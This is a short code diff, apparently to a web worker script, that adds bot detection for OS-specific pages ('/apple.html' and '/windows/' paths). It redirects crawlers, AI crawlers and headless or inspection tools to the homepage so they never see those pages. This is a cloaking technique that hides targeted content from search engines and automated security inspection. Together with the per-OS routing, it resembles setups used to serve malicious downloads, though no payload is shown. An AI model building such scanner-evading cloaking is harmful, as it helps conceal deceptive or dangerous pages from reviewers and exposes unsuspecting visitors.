@@ -94,6 +94,23 @@ export default {
       // Fallback (Linux, Android, etc.): let the request pass through to index.html
     }
 
+    // ─── PROTECT CONFIDENTIAL PAGES FROM BOTS ──────────────
+    // If a bot tries to directly access apple.html or windows.html,
+    // redirect them to the homepage instead of serving the page.
+    if (path === "/apple.html" || path.toLowerCase().startsWith("/windows/")) {
+      const ua = (request.headers.get("User-Agent") || "").toLowerCase();
+      const botKeywords = ["bot", "crawler", "spider", "googlebot", "bingbot",
+        "slurp", "duckduckbot", "baiduspider", "yandexbot", "facebot",
+        "facebookexternalhit", "twitterbot", "linkedinbot", "applebot",
+        "semrushbot", "ahrefsbot", "gptbot", "claudebot", "bytespider",
+        "petalbot", "headlesschrome", "phantomjs", "google-inspectiontool"];
+      const isBot = botKeywords.some((kw) => ua.includes(kw));
+      if (isBot) {
+        url.pathname = "/";
+        return Response.redirect(url.toString(), 302);
+      }
+    }
+
     // All other paths → pass through to origin
     return fetch(request);
   },
